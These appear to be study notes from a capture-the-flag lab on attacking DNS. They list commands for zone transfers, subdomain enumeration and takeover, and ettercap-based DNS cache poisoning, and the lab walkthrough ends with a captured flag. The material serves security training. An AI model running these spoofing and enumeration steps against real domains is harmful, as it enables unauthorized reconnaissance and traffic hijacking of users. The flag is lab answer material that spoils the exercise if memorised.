# Attacking DNS

## Enumeration

nmap -p53 -Pn -sV -sC $TARGET

## DNS Zone Transfer

### DIG - AXFR Zone Transfer

dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

### Fierce

fierce --domain zonetransfer.me

## Domain Takeovers

Domain Takeover : Claim to be the owner of the domain when it expires. (same for Subdomain)

Example :

sub.target.com.   60   IN   CNAME   anotherdomain.com

Anyone who claims anotherdomain.com will have the control of sub.target.com

## Subdomain Enumeration

Subfinder :

./subfinder -d inlanefreight.com -v

Subbrute :

git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt

-> Enumarate the CNAME of those subdomains :

host support.inlanefreight.com
support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com

## DNS Spoofing

- An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination (MITM)

- Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.

### Local DNS Cache Poisoning

cat /etc/ettercap/etter.dns
inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110

192.168.225.110 is the attacker IP address

Start the Ettercap tool

Navigating to Hosts > Scan for Hosts

Target IP -> Target1
Default Gateaway IP -> Target2

Plugins > Manage Plugins

Activate dns_spoof

-> fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110

## LAB

ns.inlanefreight.htb 

git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns.inlanefreight.htb" > ./resolvers.txt
./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt

dig CH TXT inlanefreight.htb $TARGET

./subfinder -d inlanefreight.htb -v 

nslookup -type=any -query=AXFR inlanefreight.htb $TARGET
nslookup -type=any -query=AXFR inlanefreight.htb $TARGET | grep "Name" > rawsubdomains.txt 
sed 's/Name://g' rawsubdomains.txt > subdomains.txt

Remove spaces at the beginning :

cat subdomains.txt | sed -e 's/^[ \t]*//' > subdomains.txt

while read -r line; do
  nslookup -type=any -query=AXFR $line $TARGET >> results.txt
done < subdomains.txt

dig axfr inlanefreight.htb @$TARGET
dig axfr internal.inlanefreight.htb @$TARGET

https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt

export WORDLIST="subdomains.txt"

for sub in $(cat $WORDLIST);do dig $sub.inlanefreight.htb @$TARGET | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
helpdesk.inlanefreight.htb. 604800 IN	A	10.129.10.20
control.inlanefreight.htb. 604800 IN	A	10.129.10.13

while read -r line; do
  nslookup -type=any -query=AXFR $line $TARGET >> results.txt
done < subdomains.txt

dig any helpdesk.inlanefreight.htb @$TARGET

nslookup -type=any -query=AXFR helpdesk.inlanefreight.htb $TARGET 
nslookup -type=any -query=AXFR control.inlanefreight.htb $TARGET 

dig axfr helpdesk.inlanefreight.htb @$TARGET
dig axfr control.inlanefreight.htb @$TARGET

dig CH TXT helpdesk.inlanefreight.htb $TARGET
dig CH TXT control.inlanefreight.htb $TARGET

dig AXFR @ns.inlanefreight.htb helpdesk.inlanefreight.htb $TARGET
dig AXFR @ns.inlanefreight.htb control.inlanefreight.htb $TARGET

git clone --depth 1 \
  https://github.com/danielmiessler/SecLists.git

export WORDLIST="SecLists/Discovery/DNS/subdomains-top1million-20000.txt"

dnsenum --dnsserver $TARGET --enum -p 0 -s 0 -o subdomains.txt -f $WORDLIST --threads 90 inlanefreight.htb

ns.inlanefreight.htb.                    604800   IN    A         127.0.0.1
helpdesk.inlanefreight.htb.              604800   IN    A        10.129.10.20
control.inlanefreight.htb.               604800   IN    A        10.129.10.13

dig any helpdesk.inlanefreight.htb @10.129.10.20
dig any control.inlanefreight.htb @10.129.10.13

dig axfr hr.inlanefreight.htb @$TARGET
HTB{LUIHNFAS2871SJK1259991}